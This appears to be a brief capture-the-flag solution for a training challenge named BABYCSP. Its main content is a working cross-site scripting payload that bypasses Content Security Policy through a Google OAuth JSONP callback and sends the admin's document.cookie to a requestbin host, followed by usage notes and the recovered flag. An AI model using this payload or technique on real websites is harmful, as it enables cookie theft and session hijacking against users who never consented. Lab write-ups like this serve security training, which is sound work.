# BABYCSP

Steal the admin's cookie on this website: http://babycsp.training.ctf.necst.it/

The admin will visit the pages you "report to admin" with a Gecko-based headless browser.




"><script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href='https://requestbin.training.ctf.necst.it/1okl04d1'%2bdocument.cookie;a"></script>

//https://requestbin.training.ctf.necst.it/11o6bea1  --> request bin url
//%2b toencode +
//a at the end to give a name to the following existing function(not sure if necessary)

//inject the script into the text, copy the "report to admin" and run it with the id of the script request. Should receive the flag on request bin in a while

flag{4re_yo0_s0_sure_csp_1s_useful?}